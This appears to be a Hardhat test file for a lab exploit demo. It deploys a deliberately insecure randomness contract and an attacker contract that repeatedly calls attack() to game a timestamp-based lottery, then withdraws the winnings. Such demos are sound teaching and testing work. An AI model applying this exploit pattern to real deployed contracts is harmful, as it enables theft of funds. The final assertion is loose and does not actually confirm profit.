import { expect } from "chai";
import { ethers } from "hardhat";

describe("InsecureRandom exploit demo", function () {
  it("Attack contract can selectively call play and profit", async function () {
    const [deployer, attackerEOA] = await ethers.getSigners();

    // Deploy victim
    const Victim = await ethers.getContractFactory("InsecureRandom");
    const victim = await Victim.deploy();
    await victim.waitForDeployment();

    // Fund victim with some initial balance to pay winners
    await deployer.sendTransaction({
      to: await victim.getAddress(),
      value: ethers.parseEther("1.0"),
    });

    // Deploy attacker contract
    const Attacker = await ethers.getContractFactory("InsecureRandomAttacker");
    const attacker = await Attacker.connect(attackerEOA).deploy(await victim.getAddress());
    await attacker.waitForDeployment();

    // Fund attacker contract so it can call attack()
    await attackerEOA.sendTransaction({
      to: await attacker.getAddress(),
      value: ethers.parseEther("0.1"),
    });

    // Get initial balance of attacker EOA (to measure profit after withdraw)
    const before = await ethers.provider.getBalance(attackerEOA.address);

    // Run several attack attempts (simulate attacker calling attack multiple times)
    // NOTE: each transaction is mined as separate block; attacker uses on-chain block.timestamp in each tx
    for (let i = 0; i < 5; i++) {
      //const tx = await attacker.connect(attackerEOA).attack({ gasLimit: 3_000_000 });
      const tx = await attacker.connect(attackerEOA).attack({ gasLimit: 3_000_000 });
      await tx.wait();
    }

    // Withdraw attacker contract funds to EOA
    const withdrawTx = await attacker.connect(attackerEOA).withdraw();
    await withdrawTx.wait();

    const after = await ethers.provider.getBalance(attackerEOA.address);

    // Check attacker EOA gained (after gas costs) â€” we assert it has nonzero change (profit or less gas)
    expect(after).to.be.greaterThan(before - ethers.parseEther("0.01")); // rough check
  });
});
